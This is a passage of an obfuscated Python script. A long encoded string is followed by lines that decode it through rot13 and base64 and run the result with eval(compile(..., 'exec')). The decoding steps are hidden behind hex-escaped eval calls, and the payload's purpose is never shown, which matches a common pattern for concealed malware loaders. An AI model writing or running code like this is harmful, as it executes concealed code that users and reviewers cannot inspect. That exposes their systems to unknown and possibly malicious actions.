HIIExqJH01YEwIJFycYG0gSFRMZEHkJFHMBDyOTH1H0EH5FGyMQH1ITAIMXZwZ1I0qXEx1YF01AEycIFxfmIHAJJIIYG0gMFIqJJxcFJwIYIxgPF1WXHx9TGSWAGGAJZyIMDHqHZyH0IIyMF0yQAxSHFmIXHyblGHMYHx1EFyMIEyyPE1IQISISJIyYFIAHI0qVGxcQH1MSEyyIF1qYIx1TFSMWI1AFD1EJJxgJH1EYIxyTGIAQZ01JFRWCGHkJH0MKGx5BF1ESEIqFFmWGISILFHcYIGZlE1L0IxgJF1IIExEJF1qQHyyKIx5YERZ0DIEYDxcIZmWCIxcnFIMQIxAUExcDI0AAI1qMIHcKF05KE0cTGRIHHwEIFRWCImWIG0IZIxgCD1WAIHgFF0AQAIqKFIcWI0gJF0MZJxcSD1MCIGWAGyuYAxqUI1cXHHcIF0MZAHblF1WCEx1XF0IGIRAUI05BH1AFD0EYDxgnDx1WExyTFRDmHIAIARIWJxkKDHuGAHgnDmIOJRyFFGWHIR9TGx5BJyWAH1MHAH9RH1ESIRgXE0ERZyIIERMXHIWGE0EFAH9FJyMQI0MPE0tmHGESAQEYJyZlGIMRHx1KISAEIIWJE0ZlGIySIIWAGxEHF0ERAHyQZmIAIHkTGHkHIx9THyWCGwWJIHMMDIOLH1qSJQESHR1GGwWSEH5AHIWIHIIEAH1BFmWUEHuPFSuYI1IUGQIWEID1IHISGx1JHySEIHIJE0flHyAIIycYFSAKGHuVIx5QEQASIGETFxuPFGWRHH1AFwAnD1qKFxWHZ1yYE1Z1GxERFIyQZyyUEwZ0D0qFDxIIIQD2E1yJGxcHD1IOZx5AExD1AxqnDx9nEQD2H1R1GH9XAxAUI0WCDxjlFIqGIx5BJyyYEmWFGxLmZwMGJRyVIRD0FHtlDx5OJxyIDGWBGHMRAGMUJxWCJxD0DIZ0Fx1ODycYE1Z1GxEHZ0gUHH1SWj0XoT92MFNtCFOfMJ4boJSanJZcQDcao2DtCFOgLJqcL1f6Bv0kKD0XMKMuoPuwo21jnJkyXTWup2H2AP5vZmWxMJAiMTHbM29xXFjaCUA0pzyhMm4aYPqyrTIwWlxc'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))